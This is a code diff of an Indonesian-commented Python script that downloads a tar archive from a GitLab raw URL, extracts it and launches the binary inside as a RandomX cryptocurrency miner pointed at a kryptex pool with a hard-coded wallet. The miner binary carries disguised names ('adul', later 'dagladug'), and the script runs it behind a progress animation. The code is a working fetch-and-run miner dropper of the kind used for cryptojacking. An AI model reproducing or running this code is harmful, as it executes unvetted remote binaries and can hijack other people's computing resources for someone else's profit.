@@ -59,7 +59,6 @@ import shutil
 import socket
 
 # Konfigurasi parameter
-buyu = "rx/0"
 wallet = "16meX2eiPWFAAU94fRF8u2DejfpQaV21a8bqYQviMDaSKfwuCgQJNAEauk9PTnx3jmKkTVuLXrgcbmXtAvtVUvn6K3BpnwVa6VQCRvYoeVD"
 
 # === Ambil IP lokal / worker_name dengan lebih aman dan andal ===
@@ -132,7 +131,7 @@ def run_with_loading(message, cmd, *args):
         sys.stdout.write(f"\r[✖] {message} gagal\n")
     return status
 
-# 1. Download adul.tar.gz
+# 1. Download dagladug.tar.gz
 def download_file(url, filename):
     sys.stdout.write(f"[|] Downloading {filename}...")
     sys.stdout.flush()
@@ -144,10 +143,10 @@ def download_file(url, filename):
         sys.stdout.write(f"\r[✖] Downloading {filename} gagal\n")
         return 1
 
-if download_file("https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz", "adul.tar.gz") != 0:
+if download_file("https://gitlab.com/gas-group8801643/bac/-/raw/main/dagladug.tar.gz", "dagladug.tar.gz") != 0:
     sys.exit(1)
 
-# 2. Extract adul.tar.gz
+# 2. Extract dagladug.tar.gz
 def extract_tar(filename):
     sys.stdout.write(f"[|] Extracting {filename}...")
     sys.stdout.flush()
@@ -160,14 +159,14 @@ def extract_tar(filename):
         sys.stdout.write(f"\r[✖] Extracting {filename} gagal\n")
         return 1
 
-if extract_tar("adul.tar.gz") != 0:
+if extract_tar("dagladug.tar.gz") != 0:
     sys.exit(1)
 
-print(f"Menjalankan adul dengan worker: {aming}")
+print(f"Menjalankan dagladug dengan worker: {aming}")
 
-# 3. Menjalankan ./adul dengan parameter dan animasi jam pasir
-adul_process = subprocess.Popen(
-    ["./adul", "-a", buyu, "-o", "xtm-rx-sg.kryptex.network:7038", "-u", aming, "-t", str(threads)],
+# 3. Menjalankan ./dagladug dengan parameter dan animasi jam pasir
+dagladug_process = subprocess.Popen(
+    ["./dagladug", "--disable-gpu", "--algorithm", "randomx", "--pool", "xtm-rx.kryptex.network:7038", "--wallet", "16meX2eiPWFAAU94fRF8u2DejfpQaV21a8bqYQviMDaSKfwuCgQJNAEauk9PTnx3jmKkTVuLXrgcbmXtAvtVUvn6K3BpnwVa6VQCRvYoeVD/ulena"],
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE,
     text=True
@@ -178,11 +177,11 @@ idx = 0
 
 print()
 try:
-    while adul_process.poll() is None:
+    while dagladug_process.poll() is None:
         frame = hourglass_frames[idx % len(hourglass_frames)]
         sys.stdout.write('\033[1A\033[2K')
         cols = shutil.get_terminal_size((80, 20)).columns
-        text = f"[{frame}] Proses adul sedang berjalan..."
+        text = f"[{frame}] Proses dagladug sedang berjalan..."
         x = max(0, (cols - len(text)) // 2)
         
         sys.stdout.write(f"\033[{x}G\033[1;37m{text}\033[0m\n")
@@ -191,13 +190,13 @@ try:
         time.sleep(0.3)
         idx += 1
 except KeyboardInterrupt:
-    adul_process.terminate()
+    dagladug_process.terminate()
 
 # Mengambil output log setelah proses selesai
-stdout, stderr = adul_process.communicate()
+stdout, stderr = dagladug_process.communicate()
 
 sys.stdout.write("\033[0m\n")
-print("[ SELESAI ] Proses adul telah berhenti.\n")
+print("[ SELESAI ] Proses dagladug telah berhenti.\n")
 
 if stdout:
     print("--- Output Log ---")
